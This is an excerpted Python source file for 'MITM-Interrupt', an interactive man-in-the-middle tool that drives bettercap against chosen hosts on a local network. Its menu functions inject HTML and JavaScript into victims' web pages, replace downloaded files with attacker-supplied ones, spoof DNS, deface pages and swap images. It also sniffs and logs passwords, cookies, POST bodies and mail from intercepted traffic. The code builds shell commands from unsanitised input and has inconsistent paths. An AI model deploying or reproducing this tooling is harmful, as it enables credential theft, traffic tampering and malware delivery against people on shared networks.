...
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] MITM-Interrupt must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")
...
#Configure the network interface and gateway. 
		def config0():
			global up_interface
			up_interface = open(r'/home/vishwa/MITM-Interrupt/tools/files/iface.txt', 'r').read()
			...
			global gateway
			gateway = open(r'/opt/MITM-Interrupt/tools/files/gateway.txt', 'r').read()
...
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
		...
		def scan(): 
			...
			f = open('/opt/MITM-Interrupt/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/MITM-Interrupt/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/MITM-Interrupt/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/MITM-Interrupt/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							...
							if action_pscan == "back":
								...
								save_pscan = open('/opt/MITM-Interrupt/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/MITM-Interrupt/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/MITM-Interrupt/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/MITM-Interrupt/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/MITM-Interrupt/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():
							...
							if action_ping == "back":
								...
								fping = open('/opt/MITM-Interrupt/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/MITM-Interrupt/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/MITM-Interrupt/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/MITM-Interrupt/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/MITM-Interrupt/tools/log/ping.txt | awk '{print $10}'").read()
						...
						def inject_html():
							...
							if action_inject == "back":
								...
								if html_file == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_code = os.system("cp " + html_file + " /opt/MITM-Interrupt/tools/bettercap/modules/tmp/file.html")
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/MITM-Interrupt/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							...
							if action_rdownload == "back":
								...
								module = "/opt/MITM-Interrupt/tools/bettercap/modules/http/replace_file.rb"
								...
								if file_rdownload == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/MITM-Interrupt/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
									rdownload()						
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								rdownload()
							...
							if action_snif == "back":
								...
								def snif_sslstrip():
									...
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/MITM-Interrupt/xerosniff \033[1;m")
										...
										make_file = os.system("mkdir -p /opt/MITM-Interrupt/xerosniff && cd /opt/MITM-Interrupt/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'MITM-Interrupt' -hold -e "tail -f /opt/MITM-Interrupt/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/MITM-Interrupt/xerosniff/" + filename + ".log --sniffer-output /opt/MITM-Interrupt/xerosniff/" + filename + ".pcap")
										def snifflog():
											...
											if action_log == "n":
												cmd_log = os.system("rm /opt/MITM-Interrupt/xerosniff/" + filename + ".*")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							...
							if action_dspoof == "back":
								...
								outdns = open('/opt/MITM-Interrupt/tools/files/dns.conf','w')
								...
								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/MITM-Interrupt/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
						...
						def yplay():
							...
							if action_yplay == "back":
								...
								if video_id == "back":
									...
									code_yplay = open('/opt/MITM-Interrupt/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/MITM-Interrupt/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
									yplay()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								yplay()
						...
						def replace():
							...
							if action_replace == "back":
								...
								if img_replace == "back":
									...
									img.save('/opt/MITM-Interrupt/tools/bettercap/modules/tmp/ximage.png')
									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									

									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/MITM-Interrupt/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/MITM-Interrupt/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							...
							if action_driftnet == "back":
								...
								print("\033[1;34m\n[++] All captured images will be temporarily saved in /opt/MITM-Interrupt/xedriftnet \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p /opt/MITM-Interrupt/xedriftnet && driftnet -d /opt/MITM-Interrupt/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("rm -R /opt/MITM-Interrupt/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							...
							if action_shakescreen == "back":
								...
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/MITM-Interrupt/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
								shakescreen()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								shakescreen()
						...
						def deface():
							...
							if action_deface == "back":
								...
								if file_deface == "back":
									...
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/MITM-Interrupt/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()
				...
				if cmd_0 == "scan": # Map the network
					...
					def gateway():
						...
						if n_gateway == "back":
							...
							s_gateway = open('/opt/MITM-Interrupt/tools/files/gateway.txt','w')
					...
					def iface():
						...
						if n_up_interface == "back":
							...
							s_up_interface = open('/opt/MITM-Interrupt/tools/files/iface.txt','w')
					...
					def rm_log():
						print("\033[1;32m\n[+] Do want to remove all MITM-Interrupt logs ? (y/n)\n\033[1;m")
						cmd_rmlog = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/MITM-Interrupt/xerosniff/ /opt/MITM-Interrupt/tools/log/* /opt/MITM-Interrupt/tools/bettercap/modules/tmp/* /opt/MITM-Interrupt/tools/files/dns.conf")
...
rmlog    :  Delete all MITM-Interrupt logs.

help     :  Display this help message.

exit     :  Close MITM-Interrupt.\n\033[1;m"""]
					]
					table = DoubleTable(table_datas)
					print(table.table)
